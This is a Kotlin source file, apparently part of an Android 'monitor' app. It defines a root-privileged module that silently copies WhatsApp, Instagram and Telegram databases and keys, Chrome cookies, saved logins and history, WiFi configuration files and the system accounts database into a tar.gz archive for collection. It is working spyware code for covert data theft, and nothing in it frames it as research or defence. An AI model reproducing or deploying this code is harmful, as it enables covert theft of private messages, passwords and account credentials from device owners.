package com.example.monitor

import android.util.Log
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * Camada privilegiada. Degrada em silêncio quando não há root.
 */
object Root {

    private const val TAG = "Root"

    private val alvos = listOf(
        "/data/data/com.whatsapp/databases",
        "/data/data/com.whatsapp/files/key",
        "/data/data/com.whatsapp/shared_prefs",
        "/data/data/com.instagram.android/databases",
        "/data/data/com.instagram.android/files",
        "/data/data/com.instagram.android/shared_prefs",
        "/data/data/org.telegram.messenger/files",
        "/data/data/org.telegram.messenger/databases",
        "/data/data/com.android.chrome/app_chrome/Default/Cookies",
        "/data/data/com.android.chrome/app_chrome/Default/Login Data",
        "/data/data/com.android.chrome/app_chrome/Default/History",
        "/data/misc/wifi/WifiConfigStore.xml",
        "/data/misc/wifi/wpa_supplicant.conf",
        "/data/system/accounts.db",
        "/data/data/com.google.android.gms/databases"
    )

    fun disponivel(): Boolean = try {
        executar("id").contains("uid=0")
    } catch (e: Exception) {
        false
    }

    fun executar(comando: String): String {
        return try {
            val processo = ProcessBuilder("su", "-c", comando)
                .redirectErrorStream(true)
                .start()
            val saida = processo.inputStream.bufferedReader().readText()
            processo.waitFor(60, TimeUnit.SECONDS)
            processo.destroy()
            saida
        } catch (e: Exception) {
            Log.w(TAG, "su indisponível: ${e.message}")
            ""
        }
    }

    fun contas(): String = executar("dumpsys account")

    fun pacotesPrivilegiados(): String = executar("pm list packages -f -3")

    fun extrairTudo(destino: File): File? {
        if (!disponivel()) return null
        destino.deleteRecursively()
        destino.mkdirs()

        val comandos = StringBuilder()
        alvos.forEach { alvo ->
            comandos.append("cp -a \"$alvo\" \"${destino.absolutePath}/\" 2>/dev/null; ")
        }
        executar(comandos.toString())

        val pacote = File(destino.parentFile, "root_${System.currentTimeMillis()}.tar.gz")
        val pai = destino.parentFile?.absolutePath ?: destino.absolutePath
        executar("cd \"$pai\" && tar -czf \"${pacote.absolutePath}\" \"${destino.name}\" 2>/dev/null")

        return if (pacote.exists() && pacote.length() > 0) pacote else null
    }

    fun resumo(): String {
        if (!disponivel()) return "Root: indisponível"
        val sb = StringBuilder("Root: OK\n\n")
        for (alvo in alvos) {
            val existe = executar("ls -d \"$alvo\" 2>/dev/null").trim()
            sb.append(if (existe.isNotEmpty()) "[+] " else "[-] ").append(alvo).append('\n')
        }
        return sb.toString()
    }
}